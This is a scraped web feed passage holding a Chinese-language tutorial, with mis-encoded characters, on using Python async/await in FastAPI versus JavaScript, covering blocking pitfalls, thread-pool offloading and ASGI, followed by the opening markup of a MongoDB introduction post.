  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-08T11:54:31.000Z" title="Sun Feb 08 2026 11:54:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿˜è®°å¾—å½“åˆè¢« JavaScript çš„ <code>async/await</code> æƒŠè‰³åˆ°çš„æ—¶åˆ»å—ï¼Ÿä¸€ä¸ª <code>await</code>ï¼Œå°±æŠŠé‚£äº›ç¹ççš„å›è°ƒåœ°ç‹±ï¼ˆCallback Hellï¼‰å˜æˆäº†ä¼˜é›…çš„åŒæ­¥ä»£ç ï¼Œè®© Web UI å§‹ç»ˆä¿æŒæµç•…ã€‚ä½ å¯èƒ½å¿ƒé‡Œæš—æƒ³ï¼šâ€œPython è¦æ˜¯æœ‰è¿™ç©æ„å„¿å°±å¥½äº†ã€‚â€</p>
<p>æ­å–œä½ ï¼ŒPython 3.5+ ä¸ä»…æœ‰äº†ï¼Œè€Œä¸”åœ¨ FastAPI çš„åŠ æŒä¸‹ï¼Œå®ƒæ­£ä»¥ä¸€ç§å‰æ‰€æœªæœ‰çš„å§¿æ€ï¼ŒæŒ‘æˆ˜ç€é«˜å¹¶å‘ Web æœåŠ¡çš„æé™ã€‚ç„¶è€Œï¼Œå½“ä½ æŠŠ JS é‡Œçš„å¼‚æ­¥ç›´æ¥å¹³ç§»åˆ° Pythonï¼Œå¾ˆå¯èƒ½ä¼šå‘ç°ï¼š<strong>â€œä¸ºä»€ä¹ˆæˆ‘çš„ Python å¼‚æ­¥ï¼Œæ²¡æˆ‘æƒ³è±¡çš„é‚£ä¹ˆå¿«ï¼Ÿâ€</strong></p>
<p>åˆ«æ€¥ï¼Œè¿™æœ¬â€œç”Ÿå­˜æ‰‹å†Œâ€å°±æ˜¯ä¸ºä½ å‡†å¤‡çš„ã€‚</p>
<h3 data-id="heading-0">1. è¯­æ³•å¾ˆåƒï¼Œä½†â€œè„¾æ°”â€æœ‰ç‚¹ä¸åŒ</h3>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦æ‰¿è®¤ï¼ŒPython çš„ <code>async/await</code> åœ¨è¯­æ³•å±‚é¢ä¸Šï¼Œå’Œ ES6 ç®€ç›´æ˜¯åŒèƒèƒï¼š</p>
<p><strong>JavaScript (React/Node.js):</strong></p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params">userId</span>) {
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${userId}</span>`</span>); <span class="hljs-comment">// ç½‘ç»œè¯·æ±‚</span>
    <span class="hljs-keyword">const</span> orders = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/orders?user=<span class="hljs-subst">${user.id}</span>`</span>); <span class="hljs-comment">// ä¾èµ–ä¸Šä¸€ä¸ªç»“æœ</span>
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">user</span>: <span class="hljs-keyword">await</span> user.<span class="hljs-title function_">json</span>(), <span class="hljs-attr">orders</span>: <span class="hljs-keyword">await</span> orders.<span class="hljs-title function_">json</span>() };
}
</code></pre>
<p><strong>Python (FastAPI):</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> httpx <span class="hljs-comment"># å¼‚æ­¥ HTTP å®¢æˆ·ç«¯</span>

<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">fetch_data</span>(<span class="hljs-params">user_id: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-keyword">async</span> <span class="hljs-keyword">with</span> httpx.AsyncClient() <span class="hljs-keyword">as</span> client:
        user_resp = <span class="hljs-keyword">await</span> client.get(<span class="hljs-string">f"http://api.internal/users/<span class="hljs-subst">{user_id}</span>"</span>) <span class="hljs-comment"># ç½‘ç»œè¯·æ±‚</span>
        user_data = user_resp.json()
        orders_resp = <span class="hljs-keyword">await</span> client.get(<span class="hljs-string">f"http://api.internal/orders?user=<span class="hljs-subst">{user_data[<span class="hljs-string">'id'</span>]}</span>"</span>) <span class="hljs-comment"># ä¾èµ–ä¸Šä¸€ä¸ªç»“æœ</span>
        <span class="hljs-keyword">return</span> {<span class="hljs-string">"user"</span>: user_data, <span class="hljs-string">"orders"</span>: orders_resp.json()}
</code></pre>
<p>ä½ çœ‹ï¼Œä»£ç é€»è¾‘å‡ ä¹ä¸€æ¨¡ä¸€æ ·ã€‚ä¸€ä¸ª <code>await</code>ï¼Œå°±èƒ½è®©ä½ åœ¨ç­‰å¾…ç½‘ç»œè¯·æ±‚ã€æ•°æ®åº“æŸ¥è¯¢ã€æ–‡ä»¶è¯»å†™ï¼ˆè¿™äº›éƒ½æ˜¯ I/O å¯†é›†å‹æ“ä½œï¼‰æ—¶ï¼ŒæŠŠ CPU çš„æ§åˆ¶æƒäº¤å‡ºå»ï¼Œè®© Event Loop å»å¤„ç†åˆ«çš„è¯·æ±‚ã€‚</p>
<p><strong>æ ¸å¿ƒæ€æƒ³ï¼š</strong> å¼‚æ­¥ä¸æ˜¯è®©ä½ çš„ä»£ç è·‘å¾—æ›´å¿«ï¼Œè€Œæ˜¯è®©ä½ çš„<strong>æœåŠ¡å™¨åœ¨ç­‰å¾… I/O æ—¶ä¸å†å‘å‘†ï¼Œä»è€Œèƒ½åŒæ—¶å¤„ç†æ›´å¤šçš„è¯·æ±‚ã€‚</strong></p>
<h3 data-id="heading-1">2. è­¦æƒ•â€œä¼ªå¼‚æ­¥â€ï¼šPython å¼‚æ­¥çš„éšå½¢æ€æ‰‹</h3>
<p>å½“ä½ å…´å¥‹åœ°ç»™ FastAPI çš„è·¯ç”±åŠ ä¸Š <code>async def</code>ï¼Œå¹¶å¼€å§‹è°ƒè¯•æ—¶ï¼Œå¦‚æœå‘ç°æœåŠ¡çš„å¹¶å‘èƒ½åŠ›å¹¶æ²¡æœ‰æ˜¾è‘—æå‡ï¼Œç”šè‡³æœ‰æ—¶å€™è¿˜ä¼šå¡é¡¿ï¼Œé‚£å¾ˆå¯èƒ½å°±æ˜¯ä½ é‡åˆ°äº†â€œä¼ªå¼‚æ­¥â€ã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯â€œä¼ªå¼‚æ­¥â€ï¼Ÿ</strong>
ç®€å•æ¥è¯´ï¼Œå°±æ˜¯åœ¨å¼‚æ­¥å‡½æ•° <code>async def</code> å†…éƒ¨ï¼Œæ‰§è¡Œäº†<strong>åŒæ­¥é˜»å¡</strong>çš„æ“ä½œã€‚</p>
<p>æ¯”å¦‚ï¼Œå¦‚æœä½ åœ¨ <code>async def</code> å‡½æ•°é‡Œä½¿ç”¨äº†ï¼š</p>
<ul>
<li><code>time.sleep(2)</code>ï¼ˆæ¨¡æ‹Ÿè€—æ—¶æ“ä½œï¼Œä½†å®ƒæ˜¯é˜»å¡çš„ï¼‰</li>
<li><code>requests.get('...')</code>ï¼ˆPython ä¼ ç»ŸåŒæ­¥ HTTP åº“ï¼‰</li>
<li><code>json.dumps(huge_object)</code>ï¼ˆå¤„ç†è¶…å¤§ JSON å¯¹è±¡çš„ CPU å¯†é›†å‹æ“ä½œï¼‰</li>
<li>æŸäº›æ•°æ®åº“ ORM çš„åŒæ­¥ç‰ˆæœ¬æ–¹æ³•ï¼ˆå¦‚ <code>session.query().all()</code>ï¼‰</li>
</ul>
<p>è¿™äº›æ“ä½œï¼Œæ— è®ºä½ å¤–å±‚ç”¨å¤šå°‘ <code>async/await</code> åŒ…è£…ï¼Œå®ƒéƒ½ä¼š<strong>ç›´æ¥é˜»å¡æ•´ä¸ªäº‹ä»¶å¾ªç¯ï¼ˆEvent Loopï¼‰</strong>ã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆåœ¨ JS çš„ <code>async</code> å‡½æ•°é‡Œç›´æ¥è°ƒç”¨ä¸€ä¸ªåŒæ­¥çš„ã€è€—æ—¶ 5 ç§’çš„å¾ªç¯è®¡ç®—â€”â€”é‚£ä½ çš„ Node.js æœåŠ¡ä¹Ÿä¼šç¬é—´å¡æ­»ã€‚</p>
<p><strong>ç”Ÿå­˜æ³•åˆ™ä¸€ï¼šå¼‚æ­¥å‡½æ•°ä¸­ï¼Œåªç”¨å¼‚æ­¥åº“ã€‚</strong>
å½“ä½ åœ¨ <code>async def</code> å‡½æ•°ä¸­ä½¿ç”¨ä»»ä½•å¯èƒ½é˜»å¡çš„ I/O æ“ä½œæ—¶ï¼Œè¯·åŠ¡å¿…å¯»æ‰¾å¯¹åº”çš„<strong>å¼‚æ­¥ç‰ˆæœ¬åº“</strong>ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>ç”¨ <code>asyncio.sleep()</code> æ›¿ä»£ <code>time.sleep()</code>ã€‚</li>
<li>ç”¨ <code>httpx</code> æˆ– <code>aiohttp</code> æ›¿ä»£ <code>requests</code>ã€‚</li>
<li>ç”¨ <code>asyncpg</code>ã€<code>motor</code>ï¼ˆMongoDBï¼‰ç­‰å¼‚æ­¥æ•°æ®åº“é©±åŠ¨ï¼Œæˆ–è€… ORMï¼ˆå¦‚ <code>SQLAlchemy</code> 2.0+ï¼‰çš„å¼‚æ­¥æ¨¡å¼ã€‚</li>
</ul>
<h3 data-id="heading-2">3. CPU å¯†é›†å‹ä»»åŠ¡çš„â€œé€ƒç”Ÿèˆ±â€</h3>
<p>å¼‚æ­¥ç¼–ç¨‹æ“…é•¿å¤„ç† I/O å¯†é›†å‹ä»»åŠ¡ï¼Œä½†å®ƒå¯¹ <strong>CPU å¯†é›†å‹ä»»åŠ¡</strong>å´æ— èƒ½ä¸ºåŠ›ã€‚å› ä¸º CPU å¯†é›†å‹ä»»åŠ¡çš„ç“¶é¢ˆåœ¨äº CPU æœ¬èº«ï¼Œè€Œä¸æ˜¯ç­‰å¾…ã€‚</p>
<p>å¦‚æœä½ åœ¨ <code>async def</code> å‡½æ•°ä¸­æ‰§è¡Œä¸€ä¸ªé•¿è¾¾å‡ ç§’çš„å¤æ‚è®¡ç®—ï¼ˆæ¯”å¦‚å¤§é‡çš„å­—ç¬¦ä¸²å¤„ç†ã€å›¾åƒå¤„ç†ã€æœºå™¨å­¦ä¹ æ¨ç†ç­‰ï¼‰ï¼Œå®ƒä¾ç„¶ä¼šéœ¸å  Event Loopï¼Œå¯¼è‡´å…¶ä»–ç­‰å¾…ä¸­çš„å¼‚æ­¥ä»»åŠ¡æ— æ³•å¾—åˆ°è°ƒåº¦ã€‚</p>
<p><strong>ç”Ÿå­˜æ³•åˆ™äºŒï¼šè®¡ç®—ä»»åŠ¡ï¼Œäº¤ç»™çº¿ç¨‹æ± æˆ–è¿›ç¨‹æ± ã€‚</strong></p>
<p>FastAPI æ¡†æ¶éå¸¸èªæ˜ã€‚å¦‚æœä½ å®šä¹‰çš„è·¯ç”±å‡½æ•°æ˜¯æ™®é€šçš„ <code>def</code>ï¼ŒFastAPI ä¼šè‡ªåŠ¨å°†å®ƒæ”¾åˆ°ä¸€ä¸ªç‹¬ç«‹çš„<strong>çº¿ç¨‹æ± </strong>ä¸­è¿è¡Œï¼Œè¿™æ ·å°±ä¸ä¼šé˜»å¡ä¸» Event Loopã€‚</p>
<p>ä½†å¦‚æœä½ çš„è®¡ç®—é€»è¾‘å°±åœ¨ <code>async def</code> å†…éƒ¨ï¼Œä¸”ä½ ä¸æƒ³è®©å®ƒé˜»å¡ Event Loopï¼Œä½ å°±éœ€è¦æ‰‹åŠ¨ä½¿ç”¨ <code>run_in_executor</code> æ¥å°†å®ƒâ€œå¸è½½â€åˆ°çº¿ç¨‹æ± æˆ–è¿›ç¨‹æ± ä¸­ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=<span class="hljs-number">4</span>) <span class="hljs-comment"># å¯ä»¥é…ç½®çº¿ç¨‹æ•°</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">very_heavy_cpu_task</span>(<span class="hljs-params">data</span>):
    <span class="hljs-comment"># æ¨¡æ‹Ÿè€—æ—¶è®¡ç®—</span>
    result = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">range</span>(data))
    <span class="hljs-keyword">return</span> result

<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">"/process_data"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_data</span>(<span class="hljs-params">data: <span class="hljs-built_in">int</span></span>):
    <span class="hljs-comment"># å°† CPU å¯†é›†å‹ä»»åŠ¡æäº¤åˆ°çº¿ç¨‹æ± æ‰§è¡Œï¼Œä¸é˜»å¡ Event Loop</span>
    result = <span class="hljs-keyword">await</span> asyncio.get_event_loop().run_in_executor(
        executor, very_heavy_cpu_task, data
    )
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"result"</span>: result}
</code></pre>
<h3 data-id="heading-3">4. ä» WSGI åˆ° ASGIï¼šåç«¯æ¶æ„çš„æ·±åº¦è¿›åŒ–</h3>
<p>ä½ å¯èƒ½å·²ç»ç”¨è¿‡ Flask æˆ– Djangoï¼Œå®ƒä»¬æ˜¯åŸºäº <strong>WSGI (Web Server Gateway Interface)</strong> æ ‡å‡†çš„ã€‚WSGI çš„è®¾è®¡ç†å¿µæ˜¯â€œè¯·æ±‚-å“åº”â€æ¨¡å‹ï¼Œé€šå¸¸æ¯ä¸ªè¯·æ±‚ä¼šå ç”¨ä¸€ä¸ªç‹¬ç«‹çš„çº¿ç¨‹ã€‚</p>
<p>è€Œ FastAPI æ˜¯åŸºäº <strong>ASGI (Asynchronous Server Gateway Interface)</strong> æ ‡å‡†çš„ã€‚ASGI å…è®¸ä¸€ä¸ªè¿›ç¨‹å†…çš„ Event Loop é«˜æ•ˆè°ƒåº¦æˆåƒä¸Šä¸‡ä¸ªè½»é‡çº§åç¨‹ã€‚è¿™å°±åƒï¼š</p>
<ul>
<li><strong>WSGIï¼š</strong> æ¯ä¸€ä¸ªè®¢å•ï¼ˆè¯·æ±‚ï¼‰éƒ½éœ€è¦ä¸€ä¸ªä¸“å±æœåŠ¡å‘˜ï¼ˆçº¿ç¨‹ï¼‰ä»å¤´è·Ÿåˆ°å°¾ã€‚æœåŠ¡å‘˜ä¸€æ—¦å»ä»“åº“ï¼ˆæ•°æ®åº“ I/Oï¼‰ï¼Œå°±å¾—ç­‰åœ¨ä»“åº“é—¨å£ã€‚</li>
<li><strong>ASGIï¼š</strong> ä¸€ä¸ªæ€»è°ƒåº¦å‘˜ï¼ˆEvent Loopï¼‰åŒæ—¶ç®¡ç†å¾ˆå¤šè®¢å•ã€‚å½“ä¸€ä¸ªè®¢å•éœ€è¦ç­‰ä»“åº“ï¼ˆI/Oï¼‰æ—¶ï¼Œè°ƒåº¦å‘˜ä¼šç«‹åˆ»å»å¤„ç†ä¸‹ä¸€ä¸ªè®¢å•ï¼Œç­‰ä»“åº“é‚£è¾¹å«ä»–äº†å†å›æ¥å¤„ç†ã€‚</li>
</ul>
<p>è¿™ç§åº•å±‚æ¶æ„çš„æ¼”è¿›ï¼Œè®© Python åœ¨å¤„ç†é•¿è¿æ¥ã€æµå¼æ•°æ®ï¼ˆå¦‚ LLM çš„æµå¼è¾“å‡ºï¼‰ã€é«˜å¹¶å‘ API ç­‰ç°ä»£ Web åœºæ™¯æ—¶ï¼Œæ‹¥æœ‰äº†å’Œ Node.js åª²ç¾çš„èƒ½åŠ›ã€‚</p>
<h3 data-id="heading-4">å†™åœ¨æœ€åï¼šåˆ«è®©ä½ çš„ Python å¼‚æ­¥ï¼Œè¾“åœ¨â€œç­‰å¾…â€ä¸Š</h3>
<p>è¢« JS çš„ <code>async/await</code> å® åï¼Œæ˜¯å¥½äº‹ã€‚å®ƒä¸ºä½ æ‰“å¼€äº†éé˜»å¡ç¼–ç¨‹çš„å¤§é—¨ã€‚å½“ä½ å¸¦ç€è¿™ç§ç›´è§‰æ¥åˆ° Pythonï¼Œå¹¶ç»“åˆ FastAPI çš„å·¥ç¨‹å®è·µï¼Œä½ å°†å‘ç° Python åœ¨é«˜å¹¶å‘æœåŠ¡é¢†åŸŸçš„å·¨å¤§æ½œåŠ›ã€‚</p>
<p>è®°ä½è¿™æœ¬â€œç”Ÿå­˜æ‰‹å†Œâ€çš„æ ¸å¿ƒï¼š<strong>å¼‚æ­¥ä¸æ˜¯è®©ä½ å†™ä»£ç æ›´é…·ï¼Œè€Œæ˜¯è®©ä½ çš„æœåŠ¡å™¨åœ¨é¢å¯¹ I/O ç­‰å¾…æ—¶ï¼Œèƒ½å¤Ÿæ›´â€œèªæ˜â€åœ°å·¥ä½œã€‚</strong> é‚£äº›è¢«æµªè´¹åœ¨ç­‰å¾…ä¸Šçš„ CPU å‘¨æœŸï¼Œå¦‚ä»Šéƒ½èƒ½è¢«æ¦¨å–å‡ºæœ€å¤§çš„ä»·å€¼ã€‚</p>
<p>ç°åœ¨ï¼Œæ˜¯æ—¶å€™åœ¨ä½ çš„ Python æœåŠ¡é‡Œï¼ŒçœŸæ­£é‡Šæ”¾å¼‚æ­¥çš„åŠ›é‡äº†ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MongoDBï¼ˆ1ï¼‰ä»€ä¹ˆæ˜¯MongoDBï¼Ÿ]]></title>    <link>https://juejin.cn/post/7603643044034494500</link>    <guid>https://juejin.cn/post/7603643044034494500</guid>    <pubDate>2026-02-07T23:17:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603643044034494500" data-draft-id="7603656494905360390" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MongoDBï¼ˆ1ï¼‰ä»€ä¹ˆæ˜¯MongoDBï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-02-07T23:17:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MongoDBï¼ˆ1ï¼‰ä»€ä¹ˆæ˜¯MongoDBï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-07T23:17:25.000Z" title="Sat Feb 07 2026 23:17:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body cache result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class 